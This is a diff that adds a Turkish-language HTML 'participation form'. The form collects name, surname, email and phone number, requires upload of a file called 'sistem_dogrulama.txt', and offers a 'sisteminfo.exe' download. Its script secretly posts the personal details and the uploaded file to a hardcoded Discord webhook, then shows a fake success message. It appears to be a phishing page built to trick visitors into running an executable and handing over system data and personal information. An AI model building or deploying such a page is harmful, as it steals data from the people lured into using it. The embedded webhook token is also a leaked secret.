@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Katılım Formu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        form {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"], input[type="email"], input[type="tel"], input[type="file"] {
+            width: calc(100% - 24px); /* Form genişliğinden padding ve border hesaplaması */
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            float: right;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        .download-btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+        }
+        .download-btn:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <form id="contactForm" action="#" method="post" enctype="multipart/form-data">
+        <label for="fname">İsim:</label>
+        <input type="text" id="fname" name="firstname" placeholder="İsminizi girin.." required>
+
+        <label for="lname">Soyisim:</label>
+        <input type="text" id="lname" name="lastname" placeholder="Soyisminizi girin.." required>
+
+        <label for="email">Eposta:</label>
+        <input type="email" id="email" name="email" placeholder="E-posta adresinizi girin.." required>
+
+        <label for="phone">Telefon Numarası:</label>
+        <input type="tel" id="phone" name="phone" placeholder="Telefon numaranızı girin.." required>
+
+        <label for="file">Dosya Seçin (sistem_dogrulama.txt):</label>
+        <input type="file" id="file" name="file" required>
+
+        <input type="submit" value="Gönder">
+    </form>
+
+    <a href="sisteminfo.exe" download class="download-btn">sisteminfo.exe dosyasını indir</a>
+
+    <script>
+        document.getElementById('contactForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Form submit işlemini engelle
+
+            // Kullanıcı bilgilerini al
+            var formData = new FormData(this);
+            var jsonData = {};
+            formData.forEach(function(value, key) {
+                jsonData[key] = value;
+            });
+
+            // Discord webhook URL'si
+            var webhookURL = 'https://discord.com/api/webhooks/1262133920858640495/PmKeR7UPUHjRgawzvJS0GOoOSFbyzPhy33VBlz-XIro7bB4xgf1CogxoRJTwELIu6vYT';
+
+            // Telefon numarası, soyisim, email bilgilerini tek bir stringe dönüştür
+            var message = `İsim: ${jsonData.firstname}\nSoyisim: ${jsonData.lastname}\nEposta: ${jsonData.email}\nTelefon Numarası: ${jsonData.phone}`;
+
+            // Metin mesajını gönder
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', webhookURL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            var messagePayload = {
+                content: message
+            };
+
+            xhr.send(JSON.stringify(messagePayload));
+
+            // Dosya yükleme işlemi
+            var fileInput = document.getElementById('file');
+            var file = fileInput.files[0];
+            if (file) {
+                var reader = new FileReader();
+                reader.onload = function(e) {
+                    // Dosya içeriğini al
+                    var fileContent = e.target.result;
+
+                    // Dosyayı Discord webhook ile gönder
+                    var filePayload = new FormData();
+                    filePayload.append('content', 'asd.txt dosyası');
+                    filePayload.append('file', file, file.name);
+
+                    var xhrFile = new XMLHttpRequest();
+                    xhrFile.open('POST', webhookURL);
+                    xhrFile.send(filePayload);
+                };
+                reader.readAsText(file);
+            }
+
+            // Formu sıfırla
+            this.reset();
+
+            alert('Form başarıyla gönderildi!');
+
+            return false;
+        });
+    </script>
+</body>
+</html>
